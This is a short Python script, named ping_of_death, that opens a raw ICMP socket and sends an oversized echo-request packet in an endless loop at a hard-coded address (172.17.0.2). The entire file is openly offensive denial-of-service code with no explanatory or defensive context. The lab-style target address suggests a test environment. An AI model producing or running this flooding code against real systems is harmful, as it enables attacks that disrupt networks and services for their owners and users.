import socket

def ping_of_death(target_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00\x00\x00' + (60000 * b'a')

    while True:
        s.sendto(packet, (target_ip, 0))


if __name__ == "__main__":
    target_ip = "172.17.0.2"
    ping_of_death(target_ip)
